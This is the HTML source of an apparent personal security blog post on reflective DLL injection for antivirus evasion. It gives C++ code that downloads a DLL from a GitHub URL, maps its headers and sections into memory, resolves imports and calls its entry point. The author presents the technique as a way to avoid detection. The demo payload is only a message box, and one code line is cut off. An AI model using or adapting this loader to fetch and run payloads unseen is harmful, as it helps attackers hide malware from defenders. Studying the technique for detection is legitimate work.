@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Remote Reflective DLL Injection</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-coy.min.css">
+        <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+
+    </head>
+
+    <style>
+        pre {
+            font-size: 13px;
+            border-color: white;
+        }
+    </style>
+    
+    <body style="font-size: 17px;">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="index.html">Yazid's notes</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/hidingcat.png')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Antivirus Evasion : Remote Reflective DLL Injection🏴‍☠️</h1>
+                            <h2 class="subheading">Implementation of a reflective DLL injection technique with DLL loading directly from a Github repository </h2>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!">Yazid</a>
+                                on June 7, 2023
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                      
+                        
+<p>
+In computer programming, reflectivity is the ability of a program to examine, and possibly modify, its own high-level internal structures during execution. <a href="https://attack.mitre.org/techniques/T1620/" target="_blank">Reflective programming</a> is a one of the techniques used by attackers to modify the behavior of a program in real-time to achieve their malicious objectives. Attackers can specifically use reflective programming techniques to load malicious DLLs into a process's memory without the need to save or write these DLLs to disk. This concept, known as "Reflective DLL Injection," was <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">originally conceived and implemented by Stephen Fewer</a>, and since then, several ways of achieving this objective have emerged. It is, therefore, a useful technique to evade detection by antivirus software. Once the malicious DLL is loaded, it can be used to execute arbitrary code or perform other malicious actions. </p>
+<p>
+In the case of a typical DLL injection, functions such as <code>SetWindowsHookEx</code> or <code>CreateRemoteThread</code> are triggered, and they use the <code>LoadLibrary</code> function at a certain stage of their execution, which makes the DLL visible in the list of modules loaded by the process. This is another significant advantage of reflective loading as it bypasses the call to LoadLibrary ensuring that our malicious module does not appear in the loaded modules list. Some DLLs (such as Kaspersky's klhkum.dll) can also hide their presence by detecting if they are under the control of a ring 3 debugger. I discuss this in detail in this article: <a href="https://xacone.github.io/kaspersky-klhkum.html">Kaspersky's klhkum.dll</a> !
+</p>
+
+<p>
+One of the most classical and common ways to enable reflective loading of a DLL is to obtain a handle on a target program from a malicious program that will change memory protections, allocate the necessary memory, and inject the malicious payload into it. This is typically done by parsing the addresses of functions loaded in the imports of the Kernel32.dll module, such as LoadLibraryA or VirtualAlloc (similar to a typical DLL injection), with the intention of manipulating them.
+</p>
+
+<p>
+The image below illustrates the injection process. It is important to note the change in memory protection from Page_Execute_WriteCopy to Page_Execute_ReadWrite in the allocated memory space of the victim process, allowing us to directly write into the memory space without creating a separate copy. </p>
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img src="assets/img/reflective_dll_injection_process.png">
+</div>
+
+<p>
+This technique is quite effective when we want to dynamically load a module into a remote legitimate process, such as Notepad.exe or Calculator.exe.
+
+<br><br>
+
+In this article, we will describe the steps for reflective memory loading and go even further by designing a process that will perform reflective loading within its own memory space, but <b>will also retrieve the malicious DLL from a GitHub repository!</b> Our compiled DLL can be downloaded at the following address: https://github.com/Xacone/MessageBoxDLL/raw/main/x64/Debug/MessageBoxDLL.dll
+
+<br><br>
+
+At its entry point, our DLL displays a simple message box:
+</p>
+
+<pre >
+    <code class="prettyprint">
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, "Boooouhhh !", "Reflective Dll Injection", MB_OK);
+
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+    </code>
+</pre>
+
+<p>
+    The complete source code for the process is available on <a href="https://github.com/Xacone/RemoteReflectiveDLLInjection"><b>this Github repository</b></a>, the reflective loading process is similar to that of <a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection"><b>Red Team Notes</b></a>. The aim is not to explain every line of code either, but to cover the main aspects of this fabulous technique.
+</p>
+
+<p>
+    The steps, similar to those described by Red Team Notes, are as follows:
+
+    <ol>
+        <li>Retrieving the malicious DLL from a GitHub repository.</li>
+        <li>Parsing of DLL headers and recovery of image size (from PE header).</li>
+        <li>Allocate the memory space required to contain the image and copy the headers into this space.</li>
+        <li>Processing of relative addresses (RVA) and necessary offsets via the relocation table.</li>
+        <li>Resolution of necessary modules and resolution of the import table (IAT).</li>
+        <li>Executing the DLL.</li>
+    </ol>
+</p>
+
+<h3>Retrieving the malicious DLL from a GitHub repository</h3>
+
+<p>
+    First, we attempt to obtain a handle to the remote object. The INTERNET_FLAG_RELOAD flag forces the download of the object from the original server rather than from the cache.
+
+dllBuffer is a pointer to a byte array that will hold the buffer of our DLL, and dllBufferSize is its size.
+
+We read the object in blocks of 4096 bytes. At each iteration, which corresponds to receiving new data from the object, we create a larger buffer to accommodate this new data. We then copy the content of the previous buffer into the new buffer before adding the received data to it.
+</p>
+
+<pre >
+    <code class="prettyprint"> 
+const wchar_t* raw_dll_link = L"https://github.com/Xacone/MessageBoxDLL/raw/main/x64/Debug/MessageBoxDLL.dll";
+
+HINTERNET hDllFile = InternetOpenUrlW(hInternet, raw_dll_link, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	
+if (hDllFile) {
+
+		BYTE* dllBuffer = nullptr; // global DLL buffer
+		DWORD dllBufferSize = 0;
+		DWORD bytesRead; // Size of each downloaded content
+		BYTE tempBuffer[4096];
+		while (InternetReadFile(hDllFile, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
+			BYTE* newBuffer = new BYTE[dllBufferSize + bytesRead];
+			if (newBuffer) {
+				memcpy(newBuffer, dllBuffer, dllBufferSize); // Copy existing data
+				memcpy(newBuffer + dllBufferSize, tempBuffer, bytesRead); // Append new data
+
+				delete[] dllBuffer; // Deallocate previous buffer
+
+				dllBuffer = newBuffer; // Update dllBuffer with new buffer
+				dllBufferSize += bytesRead; // Update buffer size
+			}
+		}
+
+InternetCloseHandle(hDllFile);
+    </code>
+</pre>
+
+<p>
+    At the end of the iterations, our dllBuffer contains the binary data of our DLL, ready to be used. 
+<br><br>
+This can be verified by looking at the hexadecimal values of our buffer, which is ultimately no more than a file in PE format:
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/showing_binary_hex_dump.png">
+</div>
+
+<p>The DLL header starts with 4D 5A, so it's time to start parsing the various headers in the file.</p>
+
+<h3>Parsing and copying the NT header image to freshly allocated memory</h3>
+
+<p>
+    We will start by dynamically allocating the memory space required by our DLL, the size of which is its size. The HEAP_ZERO_MEMORY flag means that the memory space is initialized with zeros.
+</p>
+
+<pre >
+    <code class="prettyprint">
+DWORD64 dllSize = (DWORD64)dllBufferSize;		
+LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
+    </code>
+</pre>
+
+<p>
+   
+    Then comes the parsing of the PE header, i.e., the image of the IMAGE_NT_HEADER64 address obtained from the DOS header, nothing very complicated so far. We will then allocate the memory space required to hold it. Here, we ask the OS to allocate memory at the preferred location of the DLL (the imageBase), but it can do so at another location if this location is already allocated. This will not change the execution, but we will have to calculate the delta between the ImageBase and the actual location in order to make the necessary offsets later.
+</p>
+
+<pre >
+    <code class="prettyprint">
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
+    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
+    SIZE_T dllImageSize = ntHeader->OptionalHeader.SizeOfImage;
+
+    // Allocation of the space needed to hold the image
+    LPVOID dllBaseAddress = VirtualAlloc((LPVOID)ntHeader->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_
+    
+    // Getting the delta between the base address and the DLL that was read in memory
+    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBaseAddress - (DWORD_PTR)ntHeader->OptionalHeader.ImageBase;
+    
+    // Copying the DLL image headers to the newly allocated space for the DLL.
+    memcpy(dllBaseAddress, dllBuffer, ntHeader->OptionalHeader.SizeOfHeaders);
+    </code>
+</pre>
+
+<p>
+    In my case, the OS doesn't act selfishly and agrees to allocate my memory to this location if it's free, so the delta is
+à 0.
+</p>
+
+<pre>
+    <code>
+[*] Process image base : 00007FF718710000
+59392
+e_lfanew: f0
+OptHeader - SizeOfImage : 25000
+OptHeader - ImageBase : 180000000
+Loaded at: 0000000180000000
+Mem delta : 0
+    </code>
+</pre>
+
+<p>We can see the beginning of our DLL image loaded into memory at address 0000000180000000.</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/memory_offset_relectie.png">
+</div>
+
+<p> So far, we've loaded our IMAGE_NT_HEADERS64 image into memory, so we can have fun parsing it: </p>
+
+<pre>
+    <code>
+0:011> dt ntdll!_IMAGE_DOS_HEADER 0000000180000000
+   +0x000 e_magic          : 0x5a4d
+   +0x002 e_cblp           : 0x90
+   +0x004 e_cp             : 3
+   +0x006 e_crlc           : 0
+   +0x008 e_cparhdr        : 4
+   +0x00a e_minalloc       : 0
+   +0x00c e_maxalloc       : 0xffff
+   +0x00e e_ss             : 0
+   +0x010 e_sp             : 0xb8
+   +0x012 e_csum           : 0
+   +0x014 e_ip             : 0
+   +0x016 e_cs             : 0
+   +0x018 e_lfarlc         : 0x40
+   +0x01a e_ovno           : 0
+   +0x01c e_res            : [4] 0
+   +0x024 e_oemid          : 0
+   +0x026 e_oeminfo        : 0
+   +0x028 e_res2           : [10] 0
+   +0x03c e_lfanew         : 0n240
+0:011> ? 0000000180000000 + 0n240
+Evaluate expression: 6442451184 = 00000001`800000f0
+0:011> dt ntdll!_IMAGE_NT_HEADERS64 00000001`800000f0
+   +0x000 Signature        : 0x4550
+   +0x004 FileHeader       : _IMAGE_FILE_HEADER
+   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER64
+    </code>
+</pre>
+
+<h3>Copying PE header sections</h3>
+
+<p>
+    Il est maintenant temps de passer aux sections de l’entête PE.
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/pe_header_sections_refl.png">
+</div>
+
+First, we obtain a pointer to the first section of our header. 
+<br>
+<code>ntHeader→FileHeader.NumberOfSections</code> informs us of the number of sections in our header. <br>
+<br>
+<pre >
+    <code class="prettyprint">
+        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
+        for (size_t i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+
+            cout << "\t[" << i << "] Section Name -> " << section->Name << endl;
+            cout << "\t\t" << "Section Virtual Address -> " << hex << section->VirtualAddress << endl;
+            cout << "\t\t" << "Section Pointer to Raw Data -> " << hex << section->PointerToRawData << endl;
+            cout << "\t\t" << "Section size of Raw Data -> " << section->SizeOfRawData << endl;
+
+            LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBaseAddress + (DWORD_PTR)section->VirtualAddress);
+            LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBuffer + (DWORD_PTR)section->PointerToRawData);
+            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
+
+            section++;
+        }
+    </code>
+</pre>
+
+<p>
+The above manipulation is a little bit subtle.
+<br><br>
+<code>sectionDestination</code> is a pointer to the memory location of the section obtained by adding the virtual address of the section to the base address of the module, this is the address to which the copy will be made.
+<br><br>
+<code>sectionBytes</code> is a pointer to the raw data of the section, which we locate in our buffer containing the DLL by adding the pointer to this data to the address of our buffer.
+<br><br>
+I always like to visualize the consistency of the data I'm manipulating with the actual results to make sure I'm not messing around:
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/section_copy_refl.png">
+</div>
+
+<br><br>
+
+<h3>Relative address (RVA) and offset treatment through relocation table</h3>
+<br>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/relocation_table_header.png">
+</div>
+
+<p>
+    Relocation tables are used to adjust relative memory addresses when a module is loaded at a base address other than that for which it was compiled (its preferred address). As mentioned previously, a delta has been calculated to represent the difference between the actual address and the module's preferred address, as a result of the general operation of virtual memory → <a href="https://en.wikipedia.org/wiki/Virtual_memory">https://en.wikipedia.org/wiki/Virtual_memory</a>
+<br><br>
+This table contains the values that require readjustment, and is an entry in the <code>.reloc</code> section of the header. The address relocation process is managed by the loader. 
+<br><br>
+More details on this link, which explains what a relocation table is: <a href="</a>">https://0xrick.github.io/win-internals/pe7/</a>, a crucial concept in operating systems.
+<br><br>
+The relocation table is divided into several blocks, each block representing the relocation base for a 4KB page.
+<br><br>
+According to the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft's documentation</a> Each block begins with an `IMAGE_BASE_RELOCATION` structure, which first defines the relocation type on 4 bits, then the RVA on 12 bits.
+</p>
+
+<pre>
+    <code  class="prettyprint">
+    typedef struct _IMAGE_BASE_RELOCATION {
+        DWORD   VirtualAddress;
+        DWORD   SizeOfBlock;
+    } IMAGE_BASE_RELOCATION;
+    typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
+    </code>
+</pre>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/base_relocation_table_schema.png">
+</div>
+
+<br>
+<br>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/relocations_on_program.png">
+</div>
+
+<p>Our header contains 3 relocation blocks, in red the respective VARs of all inputs and in yellow the calculated relocation address. This calculation is performed using the following instruction:</p>
+
+<pre>
+    <code class="prettyprint">
+    ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBaseAddress + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
+    </code>
+</pre>
+
+<br>
+
+<h3>Resolving the import table (IAT) and loading the necessary modules.</h3>
+<br>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/import_address_table_header.png">
+</div>
+
+<p>This last step, just as necessary as the others, consists in resolving the import table and loading any additional modules our DLL may need.
+<br><br>
+First of all, we retrieve the structure of the import directory - nothing could be easier - and create a structure of type PIMAGE_IMPORT_DESCRIPTOR, which represents no more than the import description, and which we point to the first import:</p>
+
+<pre>
+    <code class="prettyprint">
+    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
+    IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBaseAddress);
+    </code>
+</pre>
+
+
+<p>
+    A loop is used to iterate through the set of modules and load them using the LoadLibrary function. In this specific context, it is possible to use LoadLibrary with confidence, as we are sure that the modules loaded will be legitimate and there is no need to bypass this method.
+<br><br>
+If the library is successfully loaded, a variable called "thunk" of type PIMAGE_THUNK_DATA is declared and initialized to NULL. This variable is then used to point to the first element of the import address table (IAT) by adding the address of this first thunk to the base address of the imported module to which it belongs.
+<br><br>
+In short, the text indicates that LoadLibrary is used to load modules, and a "thunk" variable is used to access the import address table of loaded modules.
+<br><br>
+There are three methods for importing a function: 
+<br>
+<ul>
+<il>1. Import by name → The most common method is to import a function using its name. The application or module uses the function name to search for and resolve the address of that function in the loaded library. This usually involves using functions such as <b>LoadLibrary</b> and <b>GetProcAddress</b> to obtain the function's address from its name.</il><br><br>
+<il>2. Import by ordinal → This method involves importing a function using its ordinal number rather than its name. Each function exported by a library is assigned a unique ordinal number in the order of export. The application or module uses this ordinal to find and resolve the function address in the loaded library. This enables faster resolution of imported functions, as it is not necessary to search for the function name.</il><br><br>
+<il>3. Import not pointer → In some cases, instead of resolving function addresses in the import step, the application can simply store pointers to functions directly in the import table. This can happen when the application and library are statically linked, or when imported functions are resolved at compile-time rather than run-time.</il>
+</ul>
+<br><br>
+In the code block below, we use the IMAGE_SNAP_BY_ORDINAL macro to check whether the import was performed by ordinal, passing the function address value directly to GetProcAddress. On the other hand, if the import is performed by name, the function name is passed as parameter and GetProcAddress performs the resolution. The loop performs the same operation for all imports
+</p>
+
+
+<pre >
+    <code class="prettyprint">
+        if (library) {
+
+            // used to calculate the address of the import address table (IAT) for a specific DLL module.
+
+            PIMAGE_THUNK_DATA thunk = NULL;
+            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBaseAddress + importDescriptor->FirstThunk);
+
+            while (thunk->u1.AddressOfData != NULL) {
+                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
+                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
+                }
+                else {
+                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBaseAddress + thunk->u1.AddressOfData);
+                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
+                    thunk->u1.Function = functionAddress;
+                }
+                thunk++;
+            }
+        }
+    
+    </code>
+</pre>
+
+<br>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/imported_modules_and_functions.png">
+</div>
+<br><br>
+<h3>Time to detonate the DLL ! 🏴‍☠️</h3>
+
+<p>
+    And finally, the execution of the DLL payload ! 
+To do this, we calculate the address of the DLL's entry point, simply by retrieving the value of AddressOfEntryPoint.
+<br>
+We then create a pointer to the DLL entry point function of type DLLEntry and call the function pointed to :
+</p>
+
+<pre>
+<code class="prettyprint">
+    DLLEntry dllEntry = (DLLEntry)((DWORD_PTR)dllBaseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint);
+    (*dllEntry)((HINSTANCE)dllBaseAddress, DLL_PROCESS_ATTACH, 0);
+</code>
+</pre>
+
+<p>And... Boom! Our malicious charge has been executed, and only in memory 😉 .</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/boumdll.png">
+</div>
+<br>
+There's no trace of our reflectively loaded module and its payload, so we're safe from any antivirus detection!
+
+<br><br>
+<p style="font-style: none; font-size: 20px;"><b><i>References :</i></b></p>
+<i>
+
+<div>
+    
+    <a href="https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection">1. https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a><br>
+
+    <a href="https://www.giac.org/paper/gcfa/11563/hunting-ghosts-fileless-attacks/150888">2. https://www.giac.org/paper/gcfa/11563/hunting-ghosts-fileless-attacks/150888</a><br>
+
+    <a href="https://www.aldeid.com/wiki/Category:Digital-Forensics/Rootkits/User-mode-Rootkits#Manual_Mapping_/_Reflective_DLL_Injection">3. https://www.aldeid.com/wiki/Category:Digital-Forensics/Rootkits/User-mode-Rootkits#Manual_Mapping_/_Reflective_DLL_Injection</a><br>
+
+    <a href="https://fr.wikipedia.org/wiki/Portable_Executable">4. https://fr.wikipedia.org/wiki/Portable_Executable</a><br>
+    
+    <a href="https://slideplayer.com/slide/14424956">50 https://slideplayer.com/slide/14424956</a><br>
+</div>
+
+</i>   
+
+
+<p><i>I'm still learning so if you have a comment or observation on this article, feel free to contact me, my email addresses are on my <a href="https://github.com/Xacone">Github profile</a> 😸</i></p>
+
+
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <!--<li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>-->
+                            <li class="list-inline-item">
+                                <a href="http://github.com/xacone">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">Copyright &copy; Yazid 2023</div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+    <script>
+        Prism.highlightAll();
+      </script>
+</html>
